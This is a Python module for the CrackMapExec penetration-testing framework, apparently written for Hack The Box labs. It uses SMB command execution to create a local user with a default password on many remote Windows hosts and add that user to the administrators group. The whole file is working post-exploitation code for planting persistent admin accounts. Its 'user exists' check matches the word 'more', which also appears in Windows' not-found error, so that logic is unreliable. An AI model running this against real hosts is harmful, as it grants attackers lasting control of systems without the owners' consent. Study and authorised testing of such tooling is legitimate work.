#!/usr/bin/env python3
# -*- coding: utf-8 -*-

'''
In this version of the script, the user creation and addition to the administrators group have been split into two separate commands. 

The script first checks if the user already exists before attempting to create it. If the user creation command fails, an error message is displayed, and the script stops execution. 

If the addition to the administrators group fails, an error message is also displayed. On successful execution of each command, a success message is logged.

Additionally, the context.log.highlight(p) calls have been replaced with context.log.success() for successful operations and context.log.error() for errors, providing clearer feedback on outcomes.

The script also decodes the output from the command execution to ensure it is properly formatted for string operations.

'''

class CMEModule:

    name = 'createadmin'
    description = "Create a new administrator account"
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        USER    Choose a username for the administrator account. Default: plaintext
        PASS    Choose a password for the administrator. Default: HackTheBoxCME1337!
        '''

        self.user = "plaintext"
        if 'USER' in module_options:
            if not module_options['USER']:
                context.log.error('Invalid value for USER option!')
                exit(1)
            self.user = module_options['USER']

        self.password = "HackTheBoxCME1337!"
        if 'PASS' in module_options:
            if not module_options['PASS']:
                context.log.error('Invalid value for PASS option!')
                exit(1)
            self.password = module_options['PASS']

    def on_admin_login(self, context, connection):
        context.log.info('Creating user with the following values: USER {} and PASS {}'.format(self.user, self.password))
        
        # Check if user already exists
        command_check_user = 'net user {}'.format(self.user)
        p = connection.execute(command_check_user, True)
        output = p.decode('utf-8').lower()
        if 'more' in output or 'local group memberships' in output:
            context.log.error('User {} already exists!'.format(self.user))
            return
        
        # Create user
        command_create_user = 'net user {} "{}" /add'.format(self.user, self.password)
        p = connection.execute(command_create_user, True)
        output = p.decode('utf-8').lower()
        if 'completed successfully' not in output:
            context.log.error('Failed to create user. Error: {}'.format(output))
            return
        context.log.success('User {} created successfully'.format(self.user))
        
        # Add user to administrators group
        command_add_admin = 'net localgroup administrators {} /add'.format(self.user)
        p = connection.execute(command_add_admin, True)
        output = p.decode('utf-8').lower()
        if 'completed successfully' not in output:
            context.log.error('Failed to add user to administrators group. Error: {}'.format(output))
            return
        context.log.success('User {} added to administrators group successfully'.format(self.user))
